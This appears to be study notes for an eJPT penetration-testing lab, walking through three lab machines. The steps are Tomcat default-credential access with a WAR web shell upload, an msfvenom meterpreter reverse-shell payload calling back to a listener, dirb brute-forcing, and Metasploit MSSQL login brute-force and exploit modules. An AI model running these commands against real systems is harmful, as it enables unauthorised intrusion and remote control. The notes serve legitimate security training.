## eJPT 🛠

### The Black Box Walkthrough's : Box 1

#### Machine 1
- fping -a -g network id with mask 2>/dev/null
- naabu -p - ip address
- sudo nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- 172.16.64.140 -v  
- tomcat Enumeration http:ip:port/manager/html  ->   [tomcat:s3cret]
- Which helps you to upload a .war file and deploy it on the web-server [jsp web shell]
- https://github.com/BustedSec/webshell/blob/master/webshell.war
- This will lead to RCE, confirimg the base os is linux
- Creating a meterpreter payload and listen using metasploit
-  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.64.10 LPORT=3211 -f elf > meter.elf
-  rename .elf to .war upload it, delpoy and this file can be relocated at /var/lib/tomcat8/webapps
-  mv /var/lib/tomcat8/webapps/meter.war /tmp/meter ls /tmp/meter chmod +x /tmp/meter
-  reverse shell at meterpreter listener

#### Machine 2
- sudo nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- 172.16.64.140 -v  
- webserver on port 80
- dirb -u dirb http://172.16.64.140/  -> discovery a directory project, which requires uname and pass [rnadom pass admin:admin [correct]]
- dirb http://172.16.64.140/project/ -u admin:admin   [for further directory enum]
- revealed the flag path and DB credentials for next machine [fooadmin:fooadmin]
#### Machine 3
- Metasploit is ur bestie
- Search metasploit for sql version for scanners or exploits
- use auxiliary/scanner/mssql/mssql_login  [login check/bruteforce]
- use auxiliary/admin/mssql/mssql_enum     [enumeration]
- use exploit/windows/mssql/mssql_payload  [exploit]
- Gives us a meterpreter session
- 












